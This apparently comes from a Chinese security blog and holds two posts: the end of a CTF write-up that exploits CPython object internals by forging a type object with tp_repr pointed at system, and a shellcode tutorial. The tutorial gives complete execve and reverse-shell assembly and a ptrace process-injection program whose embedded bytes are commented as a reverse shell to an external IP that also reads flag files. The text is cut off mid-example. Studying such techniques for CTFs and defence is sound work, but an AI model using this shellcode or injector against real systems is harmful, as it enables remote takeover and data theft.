0,                                          /* tp_descr_set */    0,                                          /* tp_dictoffset */    dict_init,                                  /* tp_init */    PyType_GenericAlloc,                        /* tp_alloc */    dict_new,                                   /* tp_new */    PyObject_GC_Del,                            /* tp_free */    .tp_vectorcall = dict_vectorcall,&#125;;//------------------------------------------// Include/cpython/object.h//------------------------------------------/* PyTypeObject structure is defined in cpython/object.h.   In Py_LIMITED_API, PyTypeObject is an opaque structure. */typedef struct _typeobject PyTypeObject;//------------------------------------------// Include/cpython/object.h//------------------------------------------typedef struct _typeobject &#123;    PyObject_VAR_HEAD    const char *tp_name; /* For printing, in format &quot;&lt;module&gt;.&lt;name&gt;&quot; */    Py_ssize_t tp_basicsize, tp_itemsize; /* For allocation */    /* Methods to implement standard operations */    destructor tp_dealloc;    Py_ssize_t tp_vectorcall_offset;    getattrfunc tp_getattr;    setattrfunc tp_setattr;    PyAsyncMethods *tp_as_async; /* formerly known as tp_compare (Python 2)                                    or tp_reserved (Python 3) */    reprfunc tp_repr;    /* Method suites for standard classes */    PyNumberMethods *tp_as_number;    PySequenceMethods *tp_as_sequence;    PyMappingMethods *tp_as_mapping;    /* More standard operations (here for binary compatibility) */    hashfunc tp_hash;    ternaryfunc tp_call;    reprfunc tp_str;    getattrofunc tp_getattro;    setattrofunc tp_setattro;    /* Functions to access object as input/output buffer */    PyBufferProcs *tp_as_buffer;    /* Flags to define presence of optional/expanded features */    unsigned long tp_flags;    const char *tp_doc; /* Documentation string */    /* Assigned meaning in release 2.0 */    /* call function for all accessible objects */    traverseproc tp_traverse;    /* delete references to contained objects */    inquiry tp_clear;    /* Assigned meaning in release 2.1 */    /* rich comparisons */    richcmpfunc tp_richcompare;    /* weak reference enabler */    Py_ssize_t tp_weaklistoffset;    /* Iterators */    getiterfunc tp_iter;    iternextfunc tp_iternext;    /* Attribute descriptor and subclassing stuff */    struct PyMethodDef *tp_methods;    struct PyMemberDef *tp_members;    struct PyGetSetDef *tp_getset;    // Strong reference on a heap type, borrowed reference on a static type    struct _typeobject *tp_base;    PyObject *tp_dict;    descrgetfunc tp_descr_get;    descrsetfunc tp_descr_set;    Py_ssize_t tp_dictoffset;    initproc tp_init;    allocfunc tp_alloc;    newfunc tp_new;    freefunc tp_free; /* Low-level free-memory routine */    inquiry tp_is_gc; /* For PyObject_IS_GC */    PyObject *tp_bases;    PyObject *tp_mro; /* method resolution order */    PyObject *tp_cache;    PyObject *tp_subclasses;    PyObject *tp_weaklist;    destructor tp_del;    /* Type attribute cache version tag. Added in version 2.6 */    unsigned int tp_version_tag;    destructor tp_finalize;    vectorcallfunc tp_vectorcall;&#125; PyTypeObject;\n\n通过在项目中搜索字符串，找到了tp_dict的相关解释：\n//Objects/typeobject.c/* This function is called by PyType_Ready() to populate the type&#x27;s   dictionary with method descriptors for function slots.  For each   function slot (like tp_repr) that&#x27;s defined in the type, one or more   corresponding descriptors are added in the type&#x27;s tp_dict dictionary   under the appropriate name (like __repr__).  Some function slots   cause more than one descriptor to be added (for example, the nb_add   slot adds both __add__ and __radd__ descriptors) and some function   slots compete for the same descriptor (for example both sq_item and   mp_subscript generate a __getitem__ descriptor).      ...*/static intadd_operators(PyTypeObject *type)&#123;    PyObject *dict = type-&gt;tp_dict;\t...&#125;\n\n翻译：这个函数被 PyType_Ready()调用，用于将函数槽位的方法描述符填充到类型的字典中。对于类型中定义的每个函数槽位（如 tp_repr），一个或多个对应的描述符会被添加到类型的 tp_dict字典中，使用适当的名称（如 __repr__）。有些函数槽位会导致添加多个描述符（例如，nb_add槽位会同时添加 __add__和 __radd__描述符），而有些函数槽位会竞争同一个描述符（例如 sq_item和 mp_subscript都会生成 __getitem__描述符）。\n它解释了 tp_dict字段的一个关键作用：作为 Python 类在语言层面的属性和方法描述符的容器\n接下来，让我们回到题目：如何泄露程序基址——通过修改列表a的ob_item指针，从而使得[&#123;&#125;,(),&#123;&#125;,&quot;&quot;,0.0] -&gt; [dict.__dict__]，这样print(a[0])时就可以print(dict.__dict__)！现在让我们看看该如何布局：\n\n\n因此可知：\n\n\n爽读下源码：\n#ifndef Py_CPYTHON_LISTOBJECT_H#  error &quot;this header file must not be included directly&quot;#endiftypedef struct &#123;    PyObject_VAR_HEAD    /* Vector of pointers to list elements.  list[0] is ob_item[0], etc. */    PyObject **ob_item;    /* ob_item contains space for &#x27;allocated&#x27; elements.  The number     * currently in use is ob_size.     * Invariants:     *     0 &lt;= ob_size &lt;= allocated     *     len(list) == ob_size     *     ob_item == NULL implies ob_size == allocated == 0     * list.sort() temporarily sets allocated to -1 to detect mutations.     *     * Items must normally not be NULL, except during construction when     * the list is not yet visible outside the function that builds it.     */    Py_ssize_t allocated;&#125; PyListObject;PyAPI_FUNC(PyObject *) _PyList_Extend(PyListObject *, PyObject *);PyAPI_FUNC(void) _PyList_DebugMallocStats(FILE *out);/* Macro, trading safety for speed *//* Cast argument to PyListObject* type. */#define _PyList_CAST(op) (assert(PyList_Check(op)), (PyListObject *)(op))#define PyList_GET_ITEM(op, i) (_PyList_CAST(op)-&gt;ob_item[i])#define PyList_SET_ITEM(op, i, v) ((void)(_PyList_CAST(op)-&gt;ob_item[i] = (v)))#define PyList_GET_SIZE(op)    Py_SIZE(_PyList_CAST(op))\n\n原来ob_item是个指针数组，调试也确实如此\n\n\n找一个存放__dict__指针的地址，这里选择PyDict_Type对象\n\n\n 所以只要将ob_item指向的区域，写上PyDict_Type.__dict__，即将a变成：[PyDict_Type.__dict__,(),[],&quot;&quot;,0.0]，此时再print(a[0])，即可print(PyDict_Type.__dict__)，泄露elf基址。经GDB调试验证，可行。\n\n\n然而，一个有趣的现象发生了：\na = [&#123;&#125;, (), [], &quot;&quot;, 0.0]dicttype = dictprint(&quot;id(dict.__dict__):&quot;+hex(id(dicttype.__dict__)))print(&quot;id(a[0]):&quot;+hex(id(a[0])))print(&quot;id(dicttype.__dict__):&quot;+hex(id(dicttype.__dict__)))print(&quot;id(a[1]):&quot;+hex(id(a[1])))print(&quot;id(dicttype.__dict__):&quot;+hex(id(dicttype.__dict__)))print(&quot;id(a[2]):&quot;+hex(id(a[2])))print(&quot;id(dicttype.__dict__):&quot;+hex(id(dicttype.__dict__)))print(&quot;id(a):&quot;+hex(id(a)))print(&quot;id(a)-id(dicttype.__dict__):&quot;+hex(id(a)-id(dicttype.__dict__)))print(&quot;id(a[3]):&quot;+hex(id(a[3])))print(&quot;id(a[4]):&quot;+hex(id(a[4])))print(&quot;id(dicttype.__dict__):&quot;+hex(id(dicttype.__dict__)))print(&quot;id(a)-id(a[0]):&quot;+hex(id(a)-id(a[0])))print(&quot;id(a)-id(dicttype.__dict__):&quot;+hex(id(a)-id(dicttype.__dict__)))\n\n输出：\nb&#x27;id(dict.__dict__):0x77a3c75de290\\n&#x27;b&#x27;id(a[0]):0x77a3c757dfd0\\n&#x27;b&#x27;id(dicttype.__dict__):0x77a3c75de290\\n&#x27;b&#x27;id(a[1]):0x77a3c78f8250\\n&#x27;b&#x27;id(dicttype.__dict__):0x77a3c75de350\\n&#x27;b&#x27;id(a[2]):0x77a3c75ce940\\n&#x27;b&#x27;id(dicttype.__dict__):0x77a3c75de290\\n&#x27;b&#x27;id(a):0x77a3c75e4fa0\\n&#x27;b&#x27;id(a)-id(dicttype.__dict__):0x6d10\\n&#x27;b&#x27;id(a[3]):0x77a3c78fc040\\n&#x27;b&#x27;id(a[4]):0x77a3c79885b0\\n&#x27;b&#x27;id(dicttype.__dict__):0x77a3c75de290\\n&#x27;b&#x27;id(a)-id(a[0]):0x66fd0\\n&#x27;b&#x27;id(a)-id(dicttype.__dict__):0x6c50\\n&#x27;b&#x27;\\n&#x27;b&#x27;&gt; &#x27;\n\ndicttype.__dict__的地址不是固定的——据大模型解释，这是因为：\n\n字典是可变对象，任何对 dict 类的修改都会导致 __dict__ 变化\n字典存在内部优化机制，会根据使用情况重新分配内存、切换table\n每次id(...)访问，都可能造成对象内部实现的变化\n\n这种现象对于tuple等对象也存在，可能只有在特定的环境上，才能像官方的wp中固定offset也能比较稳定的利用吧。\n——假定我们顺利泄露了heap base &amp; elf base（抱着学习的态度，不钻牛角尖）\n接下来的利用再次佐证了fakeobj.py教我们的手法：构造fakeobject，劫持函数指针_repr_，在调用builtin_print时劫持执行流：\n...# craft a fake PyTypeObject with tp_repr set to libc.systemwrite_abs(addr_of_a + SCRATCH_FAKE_PyTypeObject_OFFSET + 88, p64(libc_base + LIBC_SYSTEM_OFFSET)) # tp_repr is at offset 88# set the ob_refcnt field to &quot;.bin/sh&quot; the &#x27;.&#x27; turns into &#x27;/&#x27; after refcnt incwrite_abs(addr_of_a + SCRATCH_FAKE_PyObject_OFFSET, b&#x27;.bin/sh\\x00&#x27;)# craft the fake PyObject with ob_type set to the fake PyTypeObjectwrite_abs(addr_of_a + SCRATCH_FAKE_PyObject_OFFSET + 8, p64(addr_of_a + SCRATCH_FAKE_PyTypeObject_OFFSET))# shellread(0)...\n\n五、小结\n构造fakeobj，劫持_repr_为system，对象头部覆写.bin/sh，print(fakeobj)时劫持到system(&#39;/bin/sh\\x00&#39;)\n当 tp_repr 为空，在满足一些判断条件的情况下，会打印对象所在位置——将该字段置空可泄露地址——可以通过遍历ob_type = ob_type + offset的方式尝试\npython中一切皆对象，通过指针篡改，可以利用类型混淆，实现泄露等目的\n列表、元组对象的ob_item可以尝试劫持；字典对象的ma_keys和ma_values可以尝试劫持；\n\n六、一些可阅读的参考\n《Cython系列》1. Cython 是什么？为什么要有 Cython？为什么我们要用 Cython？ - 古明地盆 - 博客园\n\nPython源码解析-dict的底层实现（PyDictObject） - 红雨520 - 博客园\n\nPython底层原理系列- - wang_yb - 博客园\n\n\n"},{"title":"The Art of Shellcode","url":"/2025/12/01/The-Art-of-Shellcode/","content":"一、使用汇编器生成 shellcode\n特别参考佬的博客：\n1、The art of shellcode - LynneHuan - 博客园\n2、V3rdant’s Blog\n\n（一）汇编1、汇编格式section .text       ; 代码段开始global _start       ; 声明程序入口点_start:             ; 程序入口标签    ; 这里是你的代码    ; 每条指令占一行\n\n例如：\n; 最简单的退出程序 - 就像C语言的 return 0;section .text    global _start_start:    ; 系统调用：exit(0)    mov rax, 60    ; 60是exit的系统调用号    mov rdi, 0     ; 退出状态码为0    syscall        ; 执行系统调用\n\n2、系统调用固定格式; 系统调用模板mov rax, 系统调用号    ; 告诉系统要做什么mov rdi, 参数1        ; 第一个参数mov rsi, 参数2        ; 第二个参数  mov rdx, 参数3        ; 第三个参数syscall              ; 执行调用\n\n（二）shellcode 构建1、退出程序section .textglobal _start_start:    ; 方法1：直接赋值（可能产生空字节）    mov rax, 60    mov rdi, 0    syscall        ; 方法2：优化版本（避免空字节）    xor rax, rax    ; rax = 0    mov al, 60      ; rax的低8位=60 (al是rax的低8位)    xor rdi, rdi    ; rdi = 0    syscall\n\n2、输出字符串section .textglobal _start_start:    ; write(1, &quot;Hello\\n&quot;, 6)    mov rax, 1          ; write系统调用号=1    mov rdi, 1          ; 文件描述符1=标准输出    mov rsi, message    ; 字符串地址    mov rdx, 6          ; 字符串长度    syscall        ; exit(0)    mov rax, 60    xor rdi, rdi    syscallsection .datamessage: db &#x27;Hello&#x27;, 0x0A  ; 0x0A是换行符\n\n3、经典 execve(“&#x2F;bin&#x2F;sh”)section .textglobal _start_start:    ; execve(&quot;/bin/sh&quot;, NULL, NULL)        ; 清空寄存器    xor rsi, rsi    ; rsi = 0 (第二个参数)    push rsi        ; 字符串结尾的null字节        ; 把&quot;/bin/sh&quot;推入栈中    mov rdi, 0x68732f6e69622f2f  ; &quot;//bin/sh&quot;的十六进制    push rdi    mov rdi, rsp    ; rdi指向字符串地址 (第一个参数)        ; 设置参数数组    push rsi        ; argv[1] = NULL    push rdi        ; argv[0] = &quot;/bin/sh&quot;    mov rsi, rsp    ; rsi指向argv数组        ; 环境变量为NULL    xor rdx, rdx    ; rdx = 0 (第三个参数)        ; 执行execve    mov al, 59      ; execve系统调用号=59    syscall\n\n4、反弹 shell（1）创建 socketmov rax, 41    ; socket()mov rdi, 2     ; AF_INET (IPv4)mov rsi, 1     ; SOCK_STREAM (TCP)xor rdx, rdx   ; protocol=0syscallmov rdi, rax   ; 保存socket描述符\n\n（2）构建连接地址; 内存布局: [AF_INET][PORT][IP][0]push 0x0100007f    ; IP: 127.0.0.1push word 0x5c11   ; 端口: 4444 (0x115c)push word 0x2      ; AF_INET: 2\n\n（3）连接mov rsi, rsp    ; 指向地址结构mov rdx, 16     ; 地址长度mov rax, 42     ; connect()syscall\n\n（4）IO 重定向mov al, 33      ; dup2()mov rsi, 0      ; stdinsyscallmov rsi, 1      ; stdout  syscallmov rsi, 2      ; stderrsyscall\n\n（5）启动 shell; execve(&quot;/bin/sh&quot;, NULL, NULL)...\n\n（6）完整代码; reverse_shell.asm - 反弹shell到指定IP和端口section .text    global _start_start:    ; 第一步: 创建socket    ; socket(AF_INET, SOCK_STREAM, 0)    mov rax, 41         ; socket系统调用号=41    mov rdi, 2          ; AF_INET=2    mov rsi, 1          ; SOCK_STREAM=1    xor rdx, rdx        ; protocol=0    syscall        ; 保存socket描述符    mov rdi, rax        ; rdi现在保存socket fd        ; 第二步: 构建sockaddr_in结构    ; 结构体: &#123;AF_INET=2, port, IP&#125;    xor rax, rax    push rax            ; 填充8字节    mov dword [rsp-4], 0x0100007f  ; IP: 127.0.0.1 (本地测试)    mov word [rsp-6], 0x5c11       ; 端口: 4444 (0x115c)    mov word [rsp-8], 0x2          ; AF_INET=2    sub rsp, 8          ; 调整栈指针        ; 第三步: connect连接    ; connect(sockfd, &amp;serv_addr, 16)    mov rsi, rsp        ; 指向sockaddr结构    mov rdx, 16         ; 地址长度=16    mov rax, 42         ; connect系统调用号=42    syscall        ; 第四步: 重定向标准输入输出错误到socket    ; dup2(sockfd, 0) - 标准输入    mov rdi, [rsp+8]    ; 获取socket fd (之前保存在栈上)    xor rax, rax    mov al, 33          ; dup2系统调用号=33    xor rsi, rsi        ; stdin=0    syscall        ; dup2(sockfd, 1) - 标准输出    mov al, 33    mov rsi, 1          ; stdout=1    syscall        ; dup2(sockfd, 2) - 标准错误    mov al, 33    mov rsi, 2          ; stderr=2    syscall        ; 第五步: 执行/bin/sh    ; execve(&quot;/bin/sh&quot;, NULL, NULL)    xor rsi, rsi    push rsi            ; 字符串结尾的null        mov rdi, 0x68732f6e69622f2f  ; &quot;//bin/sh&quot;    push rdi    mov rdi, rsp        ; rdi指向&quot;/bin/sh&quot;        push rsi            ; argv[1]=NULL    push rdi            ; argv[0]=&quot;/bin/sh&quot;    mov rsi, rsp        ; rsi指向argv        xor rdx, rdx        ; envp=NULL    mov al, 59          ; execve系统调用号=59    syscall\n\n5、template 模板; ================================; Shellcode模板; 使用方法：; nasm -f elf64 template.asm -o template.o; ld template.o -o template; objcopy -O binary --only-section=.text template.o shellcode.bin; ================================section .text    global _start_start:    ; 在这里写你的代码    ; 使用下面的模式：        ; 1. 设置系统调用号    mov rax, 系统调用号        ; 2. 设置参数    mov rdi, 参数1    mov rsi, 参数2      mov rdx, 参数3        ; 3. 执行调用    syscall        ; 示例：退出程序    mov rax, 60    ; exit    mov rdi, 0     ; 状态码    syscall\n\n（三）生成机器码使用 nasm\n# 编译汇编文件nasm -f elf64 shellcode.asm -o shellcode.o# 链接为可执行文件（测试用）ld shellcode.o -o shellcode# 提取机器码objcopy -O binary --only-section=.text shellcode.o shellcode.bin# 查看机器码hexdump -C shellcode.binod -tx1 shellcode.bin# 反汇编验证objdump -d -M intel shellcode.o\n\n生成 c 语言数组形式：\n# 生成 C 数组格式xxd -i shellcode.bin\n\n二、使用 C 编译提取 shellcode通过示例说明：\n（一）shellcode.c#define __NR_read 0#define __NR_write 1#define __NR_exit 60#define __NR_wait4 61#define __NR_ptrace 101static inline long __syscall0(long n)&#123;\tunsigned long ret;\t__asm__ __volatile__ (&quot;syscall&quot; : &quot;=a&quot;(ret) : &quot;a&quot;(n) : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);\treturn ret;&#125;static inline long __syscall1(long n, long a1)&#123;\tunsigned long ret;\t__asm__ __volatile__ (&quot;syscall&quot; : &quot;=a&quot;(ret) : &quot;a&quot;(n), &quot;D&quot;(a1) : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);\treturn ret;&#125;static inline long __syscall2(long n, long a1, long a2)&#123;\tunsigned long ret;\t__asm__ __volatile__ (&quot;syscall&quot; : &quot;=a&quot;(ret) : &quot;a&quot;(n), &quot;D&quot;(a1), &quot;S&quot;(a2)\t\t\t\t\t\t  : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);\treturn ret;&#125;static inline long __syscall3(long n, long a1, long a2, long a3)&#123;\tunsigned long ret;\t__asm__ __volatile__ (&quot;syscall&quot; : &quot;=a&quot;(ret) : &quot;a&quot;(n), &quot;D&quot;(a1), &quot;S&quot;(a2),\t\t\t\t\t\t  &quot;d&quot;(a3) : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);\treturn ret;&#125;static inline long __syscall4(long n, long a1, long a2, long a3, long a4)&#123;\tunsigned long ret;\tregister long r10 __asm__(&quot;r10&quot;) = a4;\t__asm__ __volatile__ (&quot;syscall&quot; : &quot;=a&quot;(ret) : &quot;a&quot;(n), &quot;D&quot;(a1), &quot;S&quot;(a2),\t\t\t\t\t\t  &quot;d&quot;(a3), &quot;r&quot;(r10): &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);\treturn ret;&#125;static inline long __syscall5(long n, long a1, long a2, long a3, long a4, long a5)&#123;\tunsigned long ret;\tregister long r10 __asm__(&quot;r10&quot;) = a4;\tregister long r8 __asm__(&quot;r8&quot;) = a5;\t__asm__ __volatile__ (&quot;syscall&quot; : &quot;=a&quot;(ret) : &quot;a&quot;(n), &quot;D&quot;(a1), &quot;S&quot;(a2),\t\t\t\t\t\t  &quot;d&quot;(a3), &quot;r&quot;(r10), &quot;r&quot;(r8) : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);\treturn ret;&#125;static inline long __syscall6(long n, long a1, long a2, long a3, long a4, long a5, long a6)&#123;\tunsigned long ret;\tregister long r10 __asm__(&quot;r10&quot;) = a4;\tregister long r8 __asm__(&quot;r8&quot;) = a5;\tregister long r9 __asm__(&quot;r9&quot;) = a6;\t__asm__ __volatile__ (&quot;syscall&quot; : &quot;=a&quot;(ret) : &quot;a&quot;(n), &quot;D&quot;(a1), &quot;S&quot;(a2),\t\t\t\t\t\t  &quot;d&quot;(a3), &quot;r&quot;(r10), &quot;r&quot;(r8), &quot;r&quot;(r9) : &quot;rcx&quot;, &quot;r11&quot;, &quot;memory&quot;);\treturn ret;&#125;static inline long __syscall_ret(unsigned long r)&#123;\tif (r &gt; -4096UL) &#123;\t\treturn -1;\t&#125;\treturn r;&#125;#define __scc(X) ((long) (X))#define __syscall1(n,a) __syscall1(n,__scc(a))#define __syscall2(n,a,b) __syscall2(n,__scc(a),__scc(b))#define __syscall3(n,a,b,c) __syscall3(n,__scc(a),__scc(b),__scc(c))#define __syscall4(n,a,b,c,d) __syscall4(n,__scc(a),__scc(b),__scc(c),__scc(d))#define __syscall5(n,a,b,c,d,e) __syscall5(n,__scc(a),__scc(b),__scc(c),__scc(d),__scc(e))#define __syscall6(n,a,b,c,d,e,f) __syscall6(n,__scc(a),__scc(b),__scc(c),__scc(d),__scc(e),__scc(f))#define __syscall7(n,a,b,c,d,e,f,g) __syscall7(n,__scc(a),__scc(b),__scc(c),__scc(d),__scc(e),__scc(f),__scc(g))#define __SYSCALL_NARGS_X(a,b,c,d,e,f,g,h,n,...) n#define __SYSCALL_NARGS(...) __SYSCALL_NARGS_X(__VA_ARGS__,7,6,5,4,3,2,1,0,)#define __SYSCALL_CONCAT_X(a,b) a##b#define __SYSCALL_CONCAT(a,b) __SYSCALL_CONCAT_X(a,b)#define __SYSCALL_DISP(b,...) __SYSCALL_CONCAT(b,__SYSCALL_NARGS(__VA_ARGS__))(__VA_ARGS__)#define __syscall(...) __SYSCALL_DISP(__syscall,__VA_ARGS__)#define syscall(...) __syscall_ret(__syscall(__VA_ARGS__))typedef unsigned char u8;typedef unsigned short u16;typedef unsigned int u32;typedef unsigned int uint;typedef unsigned long int u64;typedef unsigned long int size_t;#define NULL 0#define SUCCESS 0#define FAILURE 1static inline int write(int fd, void* buf, int sz)&#123;    return syscall(__NR_write, fd, buf, sz);&#125;static inline int exit(int status)&#123;    return syscall(__NR_exit, status);&#125;static inline int waitpid(long pid, long status, long option)&#123;    return syscall(__NR_wait4, pid, status, option, 0);&#125;static inline int ptrace(long req, long pid, long addr, long data)&#123;    return syscall(__NR_ptrace, req, pid, addr, data);&#125;static inline int strlen(const char * buf)&#123;    int l = 0;    while (*buf) &#123;        buf++;        l++;    &#125;    return l;&#125;static inline void puts(const char *s)&#123;    int r = write(1, s, strlen(s));    write(1, &quot;\\n&quot;, 1);    return r;&#125;#define die(s) \\puts (s); \\return FAILUREstruct user_regs_struct&#123;  unsigned long long int r15;  unsigned long long int r14;  unsigned long long int r13;  unsigned long long int r12;  unsigned long long int rbp;  unsigned long long int rbx;  unsigned long long int r11;  unsigned long long int r10;  unsigned long long int r9;  unsigned long long int r8;  unsigned long long int rax;  unsigned long long int rcx;  unsigned long long int rdx;  unsigned long long int rsi;  unsigned long long int rdi;  unsigned long long int orig_rax;  unsigned long long int rip;  unsigned long long int cs;  unsigned long long int eflags;  unsigned long long int rsp;  unsigned long long int ss;  unsigned long long int fs_base;  unsigned long long int gs_base;  unsigned long long int ds;  unsigned long long int es;  unsigned long long int fs;  unsigned long long int gs;&#125;;#define PTRACE_ATTACH 16#define PTRACE_DETACH 17#define PTRACE_GETREGS 12#define PTRACE_SETREGS 13#define PTRACE_PEEKDATA 2#define PTRACE_POKEDATA 5#define PTRACE_CONT 7#define PTRACE_INTERRUPT 0x4207// gcc -nostdlib -o test test.c -static -T ./link.lds -Os -w -Wl,-gc-sections &amp;&amp; strip ./teststatic inline int run2(int child, int has_attach)&#123;\tint res;\tif(!has_attach) &#123;\t\tif (ptrace(PTRACE_ATTACH, child, 0, 0) &lt; 0) &#123;\t\t\tdie(&quot;PTRACE_ATTACH&quot;);\t\t&#125;\t&#125;\tint status;\twaitpid(child, &amp;status, 0);\t// 保存当前状态\tstruct user_regs_struct save_pt_reg;\t// 保存被覆盖的 shellcode\t#define CODE_LEN 300\t// 反弹 shell 给 120.25.122.195 15680\tu8 buf[0x400] = &#123;144, 144, 144, 144, 106, 41, 88, 106, 2, 95, 106, 1, 94, 153, 15, 5, 106, 41, 88, 106, 2, 95, 106, 1, 94, 153, 15, 5, 72, 137, 197, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 3, 1, 60, 65, 121, 24, 123, 194, 72, 49, 4, 36, 106, 42, 88, 72, 137, 239, 106, 16, 90, 72, 137, 230, 15, 5, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 103, 109, 96, 102, 1, 1, 1, 72, 49, 4, 36, 106, 2, 88, 72, 137, 231, 49, 246, 15, 5, 65, 186, 255, 255, 255, 127, 72, 137, 198, 106, 40, 88, 72, 137, 239, 153, 15, 5, 106, 116, 72, 184, 47, 102, 108, 97, 103, 46, 116, 120, 80, 106, 2, 88, 72, 137, 231, 49, 246, 15, 5, 65, 186, 255, 255, 255, 127, 72, 137, 198, 106, 40, 88, 72, 137, 239, 153, 15, 5, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 103, 46, 103, 109, 96, 102, 1, 1, 72, 49, 4, 36, 72, 184, 47, 104, 111, 109, 101, 47, 99, 116, 80, 106, 2, 88, 72, 137, 231, 49, 246, 15, 5, 65, 186, 255, 255, 255, 127, 72, 137, 198, 106, 40, 88, 72, 137, 239, 153, 15, 5, 104, 121, 117, 1, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 102, 47, 102, 108, 97, 103, 46, 116, 80, 72, 184, 47, 104, 111, 109, 101, 47, 99, 116, 80, 106, 2, 88, 72, 137, 231, 49, 246, 15, 5, 65, 186, 255, 255, 255, 127, 72, 137, 198, 106, 40, 88, 72, 137, 239, 153, 15, 5, 72, 137, 239, 106, 3, 88, 15, 5, 204&#125;;\tuint save_opcode[CODE_LEN/4] = &#123;0&#125;;\tuint *opcode = (uint *)buf;\t//获取寄存器\tif (ptrace(PTRACE_GETREGS, child, NULL, &amp;save_pt_reg) &lt; 0) &#123;\t\tdie(&quot;PTRACE_GETREGS&quot;);\t&#125;\t// printf(&quot;GET RIP: 0x%lx\\n&quot;, save_pt_reg.rip);\t// 保存原有的 opcode\tfor (size_t i = 0; i &lt; CODE_LEN / 4; i++)\t&#123;\t\tsave_opcode[i] = ptrace(PTRACE_PEEKDATA, child, save_pt_reg.rip + i*4, NULL);\t&#125;\tputs(&quot;save!&quot;);\t// 注入 shellcode\tfor (size_t i = 0; i &lt; CODE_LEN / 4; i++)\t&#123;\t\tif (ptrace(PTRACE_POKEDATA, child, save_pt_reg.rip + i*4, opcode[i]) &lt; 0)\t\t&#123;\t\t\tdie(&quot;PTRACE_POKEDATA 1&quot;);\t\t&#125;\t&#125;\t// // 继续走\tif (ptrace(PTRACE_CONT, child, NULL, 0) &lt; 0) &#123;\t\tdie(&quot;PTRACE_CONT 1&quot;);\t&#125;\tputs(&quot;inject!&quot;);\twaitpid(child, &amp;status, 0);    ptrace(PTRACE_INTERRUPT, child, 0, 0);\t// 恢复\tfor (size_t i = 0; i &lt; CODE_LEN / 4; i++)\t&#123;\t\tif (ptrace(PTRACE_POKEDATA, child, save_pt_reg.rip + i*4, save_opcode[i]) &lt; 0)\t\t&#123;\t\t\tdie(&quot;PTRACE_POKEDATA 2&quot;);\t\t&#125;\t&#125;\tif (ptrace(PTRACE_SETREGS, child, NULL, &amp;save_pt_reg) &lt; 0) &#123;\t\tdie(&quot;PTRACE_SETREGS&quot;);\t&#125;\tif (ptrace(PTRACE_CONT, child, NULL, 0) &lt; 0) &#123;\t\tdie(&quot;PTRACE_CONT 2&quot;);\t&#125;\tputs(&quot;recover!&quot;);\tptrace(PTRACE_DETACH, child, 0, 0);\tputs(&quot;detach!&quot;);\treturn SUCCESS;&#125;int _start()&#123;\t// 第一个参数是 pid，根据需要修改即可\trun2(22093, 0);    exit(0);&#125;\n\n（二）编译link.lds\nENTRY(_start)SECTIONS&#123;  . = 0x8048000 + SIZEOF_HEADERS;  tiny : &#123; *(.text) *(.data) *(.rodata*) &#125;  /DISCARD/ : &#123; *(*) &#125;&#125;\n\n编译\ngcc -nostdlib -o test test.c -static -T ./link.lds -Os -w -Wl,-gc-sections &amp;&amp; strip ./test\n\n（三）python3 剥离 shellcodefrom pwncli import *res = os.system(&quot;gcc -nostdlib -o ezshellcode_exp ezshellcode_exp.c -static -T ./link.lds -Os -w -Wl,-gc-sections &amp;&amp; strip ./ezshellcode_exp&quot;)assert rer == 0eee = ELF(&quot;./ezshellcode_exp&quot;, checksec=False)ss = eee.get_section_by_name(&quot;tiny&quot;)\n\n三、C 语言内联汇编（一）基本格式asm [volatile] (     &quot;汇编指令1\\n\\t&quot;    &quot;汇编指令2\\n\\t&quot;    ...    : 输出操作数          // 可选    : 输入操作数          // 可选    : 被破坏的寄存器/内存  // 可选);\n\n或者使用 __asm__（和 asm 完全一样，更显式）：\n__asm__ volatile (    &quot;汇编指令&quot;    : 输出    : 输入    : 破坏);\n\n关键部分说明：\n\n\n\n部分\n说明\n\n\n\nasm 或 __asm__\n表示内联汇编代码块的开始\n\n\nvolatile\n（可选）告诉编译器不要优化此段汇编，保证按书写顺序执行\n\n\n“汇编指令”\n真正的汇编代码，比如 &quot;movl $1, %eax&quot;，多条指令用 \\n\\t 分隔\n\n\n输出操作数\n汇编代码 写入 的 C 变量，用 &quot;=r&quot; 等约束表示\n\n\n输入操作数\n汇编代码 读取 的 C 变量，用 &quot;r&quot; 等约束表示\n\n\n被破坏的部分\n告诉编译器本汇编修改了哪些寄存器或内存，防止优化错误，如 &quot;memory&quot; 或 &quot;eax&quot;\n\n\n（二）操作数约束说明在输入&#x2F;输出操作数中，我们使用 约束（constraints） 来告诉编译器如何处理 C 变量。\n\n\n\n约束\n含义\n\n\n\n&quot;r&quot;\n使用任意通用寄存器\n\n\n&quot;m&quot;\n操作数是内存地址\n\n\n&quot;i&quot;\n操作数是立即数（常数）\n\n\n&quot;g&quot;\n操作数可以是寄存器、内存或立即数\n\n\n&quot;=r&quot;\n输出操作数（写入到寄存器，然后存入变量）\n\n\n&quot;+r&quot;\n输入+输出操作数（读写）\n\n\n&quot;&amp;&quot;\n该操作数是临时寄存器，仅汇编内部使用\n\n\n&quot;memory&quot;\n告诉编译器本汇编代码修改了内存，防止乱序优化\n\n\n&quot;cc&quot;\n告诉编译器本汇编修改了标志寄存器（如零标志、进位标志等）\n\n\n（三）简单示例：使用输入和输出 —— C 变量与汇编交互1、demo：将两个整数相加，使用汇编实现，结果存回 C 变量#include &lt;stdio.h&gt;int main() &#123;    int a = 10;    int b = 20;    int result;    __asm__ volatile (        &quot;addl %[b_input], %[result_output]&quot;  // 汇编指令：result = result + b        : [result_output] &quot;=r&quot; (result)      // 输出操作数：result 放入寄存器，再写回变量        : [a_input] &quot;r&quot; (a),                 // 输入操作数 a          [b_input] &quot;r&quot; (b),                 // 输入操作数 b          [result_output] &quot;0&quot; (a)            // result 初始值为 a（可选，这里为了演示）    );    // 更清晰、更常用的写法如下：    a = 10;    b = 20;    result = a;  // 先让 result = a    __asm__ volatile (        &quot;addl %[b_val], %[result_val]&quot;        : [result_val] &quot;=r&quot; (result)        : [b_val] &quot;r&quot; (b), [result_val] &quot;0&quot; (result)    );    // 最推荐的标准、易读写法：    a = 10;    b = 